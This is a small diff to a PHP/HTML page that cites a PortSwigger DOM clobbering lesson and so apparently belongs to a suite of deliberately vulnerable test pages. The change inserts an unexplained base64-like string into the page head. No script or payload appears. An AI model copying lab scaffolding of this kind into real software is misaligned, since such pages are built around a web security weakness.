@@ -4,6 +4,7 @@ require_once('../_helpers/strip.php');
 <html>
   <!-- From https://portswigger.net/web-security/dom-based/dom-clobbering -->
   <head>
+"82nr05Lm7QBBZHeSoC6jccRsbcHausuIBfn0OKu+BoJdhN4tr23NkCFQqDEA9orep0JgwFxij31v+AStlIxDbQ=="
 
   </head>
   <body>
